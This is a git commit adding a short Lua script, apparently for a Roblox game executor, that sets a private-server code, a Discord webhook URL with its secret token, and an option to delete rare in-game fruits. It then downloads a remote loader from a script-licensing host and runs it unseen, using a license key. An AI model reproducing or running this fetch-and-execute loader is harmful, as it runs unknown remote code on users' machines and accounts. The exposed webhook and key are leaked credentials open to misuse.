5399a60f11b6d3fe5bd34207ef8970312eb63a66
SellfC <110660214+SellfC@users.noreply.github.com>
2025-09-02 08:54:44 +0300

    Create killer.lua

---
+++ killer.lua
@@ -0,0 +1,6 @@
+getgenv().PsCode = "VezjhDNEvi"
+getgenv().Webhook = "https://discord.com/api/webhooks/1411704389550211123/QpQVvJOpLiDc_UOBroLhlW_xB7cA1lR8MhUJ5epNz9WSa6shwESQxqWQydIeL7xluTvx"
+getgenv().AutoDropRare = true --deletes rare fruits if true
+
+script_key="OnceJnwOrwgSJEGIdnbRMlOtlmcCSDSa";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1688763f40874b920132070abf865c66.lua"))()
